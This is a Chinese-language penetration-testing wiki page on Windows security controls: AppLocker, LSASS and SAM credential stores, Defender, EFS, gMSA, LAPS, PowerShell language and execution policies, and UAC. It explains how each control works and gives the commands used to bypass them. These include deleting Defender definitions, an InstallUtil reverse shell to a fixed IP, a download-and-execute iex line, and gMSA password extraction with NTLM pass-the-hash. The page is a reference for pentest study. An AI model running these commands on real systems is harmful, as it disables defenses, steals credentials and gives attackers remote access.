# Windows 安全控制

{{#include ../../banners/hacktricks-training.md}}

## AppLocker 策略

应用程序白名单是一份已批准的软件应用或可执行文件清单，允许在系统上存在并运行。其目标是保护环境免受有害恶意软件和不符合组织特定业务需求的未批准软件的影响。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) 是 Microsoft's **应用程序白名单解决方案**，并赋予系统管理员对 **用户可以运行哪些应用和文件** 的控制权。它提供对可执行文件、脚本、Windows 安装程序文件、DLLs、打包应用程序和打包应用安装程序的**细粒度控制**。\
组织通常会**阻止 cmd.exe 和 PowerShell.exe**，并限制对某些目录的写入权限，**但这些都可以被绕过**。

### 检查

检查哪些文件/扩展被列入黑名单/白名单：
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
该注册表路径包含 AppLocker 应用的配置和策略，提供了一种查看系统当前强制实施的规则集的方法：

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- 有用的 **可写文件夹** 用于绕过 AppLocker 策略：如果 AppLocker 允许在 `C:\Windows\System32` 或 `C:\Windows` 中执行任何内容，则存在一些 **可写文件夹** 可用于 **绕过此限制**。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 常见的 **被信任** 的 [**"LOLBAS's"**](https://lolbas-project.github.io/) 二进制文件也可用于绕过 AppLocker。
- **写得不严谨的规则也可能被绕过**
- 例如，**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**，你可以在任何地方创建一个名为 `allowed` 的**文件夹**，它将被允许。
- 组织通常会专注于**阻止 `%System32%\WindowsPowerShell\v1.0\powershell.exe` 可执行文件**，但会忽略 [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) 等 **其他** 可执行位置，例如 `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` 或 `PowerShell_ISE.exe`。
- **几乎很少启用 DLL 强制执行**，因为它会给系统增加额外负载，并且需要大量测试以确保不会出现问题。因此使用 **DLLs 作为后门将有助于绕过 AppLocker**。
- 你可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 在任何进程中**执行 Powershell** 代码并绕过 AppLocker。更多信息请参见: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## 凭证存储

### Security Accounts Manager (SAM)

本地凭证存在此文件中，密码为哈希值。

### 本地安全权限 (LSA) - LSASS

这些**凭证**（哈希）被**保存**在该子系统的**内存**中，用于单点登录原因。\
**LSA** 管理本地的**安全策略**（密码策略、用户权限……）、**认证**、**访问令牌**...\
LSA 会**检查** SAM 文件中提供的凭证（用于本地登录），并与**域控制器**通信以验证域用户。

这些**凭证**被**保存在**进程 LSASS 中：Kerberos 票证、NT 和 LM 哈希、易被解密的密码。

### LSA secrets

LSA 可能会将某些凭据保存到磁盘：

- Active Directory 计算机帐户的密码（当域控制器不可达时）。
- Windows 服务帐户的密码
- 计划任务的密码
- 更多（IIS 应用的密码...）

### NTDS.dit

它是 Active Directory 的数据库。仅存在于域控制器上。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) 是在 Windows 10、Windows 11 以及 Windows Server 版本中可用的防病毒软件。它**阻止**常见的 pentesting 工具，例如 **`WinPEAS`**。然而，存在绕过这些防护的方法。

### 检查

要检查 **Defender** 的**状态**，你可以执行 PS cmdlet **`Get-MpComputerStatus`**（检查 **`RealTimeProtectionEnabled`** 的值以确认其是否激活）：

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

要枚举它，你也可以运行：
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## 加密文件系统 (EFS)

EFS 通过加密来保护文件，使用称为 **File Encryption Key (FEK)** 的 **对称密钥**。该密钥用用户的 **公钥** 加密并存储在加密文件的 $EFS **替代数据流** 中。当需要解密时，会使用用户数字证书对应的 **私钥** 从 $EFS 流中解密 FEK。更多细节见 [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**无需用户主动操作的解密情形** 包括：

- 当文件或文件夹移动到非 EFS 的文件系统（例如 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)）时，会被自动解密。
- 通过 SMB/CIFS 协议通过网络传输加密文件时，会在传输前被解密。

该加密方式允许文件所有者对加密文件进行 **透明访问**。但仅仅更改所有者密码并登录并不会允许解密。

**要点**：

- EFS 使用对称 FEK，并用用户的公钥加密该 FEK。
- 解密时使用用户的私钥以访问 FEK。
- 在特定情况下（如复制到 FAT32 或网络传输）会发生自动解密。
- 所有者可以无需额外步骤访问加密文件。

### Check EFS info

检查某个 **用户** 是否 **使用过** 该 **服务**，可检查此路径是否存在：`C:\users\<username>\appdata\roaming\Microsoft\Protect`

使用 cipher /c \<file\> 检查 **谁** 有权访问该文件。你也可以在文件夹内使用 `cipher /e` 和 `cipher /d` 来 **加密** 或 **解密** 所有文件。

### Decrypting EFS files

#### 使用 SYSTEM 权限

此方法要求 **受害用户** 在主机上 **运行** 某个 **进程**。如果满足此条件，使用 `meterpreter` 会话可以模拟该用户进程的令牌（`impersonate_token` 来自 `incognito`）。或者你也可以 `migrate` 到该用户的进程。

#### 已知用户密码


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## 组托管服务帐户 (gMSA)

Microsoft 开发了 **Group Managed Service Accounts (gMSA)**，以简化 IT 基础设施中服务帐户的管理。与常常启用 “Password never expire” 设置的传统服务帐户不同，gMSA 提供了更安全且更易管理的解决方案：

- **自动密码管理**：gMSA 使用复杂的 240 字符密码，并根据域或计算机策略自动更换。此过程由 Microsoft 的 Key Distribution Service (KDC) 处理，消除了手动更新密码的需求。
- **增强的安全性**：这些帐户不会被锁定，并且不能用于交互式登录，提高了安全性。
- **多主机支持**：gMSA 可以在多台主机之间共享，适用于在多台服务器上运行的服务。
- **计划任务支持**：与 managed service accounts 不同，gMSA 支持运行计划任务。
- **简化的 SPN 管理**：当计算机的 sAMAccount 信息或 DNS 名称发生变化时，系统会自动更新 Service Principal Name (SPN)，简化了 SPN 管理。

gMSA 的密码存储在 LDAP 属性 _**msDS-ManagedPassword**_ 中，并由域控制器 (DCs) 每 30 天自动重置。该密码是一个称为 [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) 的加密数据块，只能被授权的管理员以及安装了 gMSA 的服务器检索，以确保持久的安全环境。要访问此信息，需要使用诸如 LDAPS 的安全连接，或连接必须经过 ‘Sealing & Secure’ 认证。

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.

### 滥用 ACL chaining 来 read gMSA managed password (GenericAll -> ReadGMSAPassword)

在许多环境中，低权限用户可以通过滥用配置不当的对象 ACL，在不破坏 DC 的情况下访问 gMSA 秘密：

- 你可控制的一个组（例如通过 GenericAll/GenericWrite）被授予对 gMSA 的 `ReadGMSAPassword` 权限。
- 通过将自己添加到该组，你将继承通过 LDAP 读取 gMSA 的 `msDS-ManagedPassword` blob 的权限，并派生出可用的 NTLM 凭证。

典型工作流程：

1) 使用 BloodHound 发现路径，并将你的 foothold principals 标注为 Owned。查找如下边：
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) 将自己添加到你控制的中间组（以 bloodyAD 为例）：
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) 通过 LDAP 读取 gMSA 的托管密码并推导 NTLM 哈希。NetExec 自动化提取 `msDS-ManagedPassword` 并转换为 NTLM：
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) 以 gMSA 身份使用 NTLM hash 进行身份验证（不需要 plaintext）。如果该账户位于 Remote Management Users，WinRM 将直接可用：
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
注意：
- LDAP 对 `msDS-ManagedPassword` 的读取需要 sealing（例如 LDAPS/sign+seal）。工具会自动处理此项。
- gMSAs 常常被授予如 WinRM 之类的本地权限；验证组成员身份（例如 Remote Management Users）以规划 lateral movement。
- 如果你只需要该 blob 来自行计算 NTLM，请参见 MSDS-MANAGEDPASSWORD_BLOB structure。



## LAPS

**本地管理员密码解决方案 (LAPS)**，可从 [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) 下载，用于管理本地管理员密码。这些密码是**随机生成的**、唯一的，并且**定期更改**，集中存储在 Active Directory 中。对这些密码的访问通过 ACLs 限制为授权用户。若授予足够的权限，则可以读取本地管理员密码。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **会锁定许多用于有效使用 PowerShell 的功能**，例如阻止 COM 对象、仅允许经批准的 .NET 类型、基于 XAML 的工作流、PowerShell 类等。

### **检查**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### 绕过
```bash
#Easy bypass
Powershell -version 2
```
在当前的 Windows 中那个 Bypass 无法工作，但你可以使用[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**要编译它你可能需要** **去** _**添加引用**_ -> _浏览_ -> _浏览_ -> 添加 `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` 并 **将项目更改为 .Net4.5**。

#### 直接绕过：
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
你可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 在任意进程中 **执行 Powershell** 代码 并 bypass the constrained mode。更多信息请查看: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS Execution Policy

默认情况下它被设置为 **restricted.** 绕过(bypass) 此策略的主要方法：
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
更多内容请见 [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

是用于对用户进行身份验证的 API。

SSPI 负责为想要通信的两台机器找到合适的协议。首选方法是 Kerberos。然后 SSPI 将协商将使用哪个身份验证协议，这些身份验证协议称为 Security Support Provider (SSP)，以 DLL 的形式位于每台 Windows 机器内部，且双方必须都支持相同的 SSP 才能通信。

### 主要 SSPs

- **Kerberos**: The preferred one
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Compatibility reasons
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers and LDAP, password in form of a MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL and TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: It is used to negotiate the protocol to use (Kerberos or NTLM being Kerberos the default one)
- %windir%\Windows\System32\lsasrv.dll

#### The negotiation could offer several methods or only one.

## UAC - 用户帐户控制

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一个功能，可在执行提升权限的活动时启用 **同意提示**。


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
